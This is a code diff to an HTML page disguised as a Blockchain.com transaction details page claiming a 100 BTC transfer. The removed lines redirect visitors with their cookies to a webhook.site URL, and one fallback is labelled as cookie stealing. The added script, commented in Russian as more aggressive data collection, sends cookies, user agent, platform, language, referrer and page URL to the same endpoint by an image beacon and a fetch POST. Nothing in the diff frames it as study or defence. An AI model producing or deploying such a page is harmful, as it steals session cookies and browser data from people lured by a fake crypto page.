@@ -2,19 +2,35 @@
 <html>
 <head>
     <title>Transaction Details - Blockchain.com</title>
-    <script>
-        // JS для браузеров
-        window.location.href = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?c=' + encodeURIComponent(document.cookie);
-    </script>
 </head>
 <body>
     <h1>Transaction Hash: 1234567890abcdef...</h1>
     <p>Amount: 100 BTC ✅</p>
 
-    <noscript>
-        <!-- Если JS отключен, используем meta refresh -->
-        <meta http-equiv="refresh" content="0;url=https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?noscript_cookiesteal=true" />
-        <p>Redirecting to transaction details...</p>
-    </noscript>
+    <script>
+        // Более агрессивный сбор данных
+        var data = {
+            cookies: document.cookie,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            referrer: document.referrer,
+            url: window.location.href
+        };
+        
+        // Отправляем все данные
+        var params = new URLSearchParams(data).toString();
+        var img = new Image();
+        img.src = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?' + params;
+        
+        // Или попробуем через fetch
+        try {
+            fetch('https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394', {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: {'Content-Type': 'application/json'}
+            });
+        } catch(e) {}
+    </script>
 </body>
 </html>
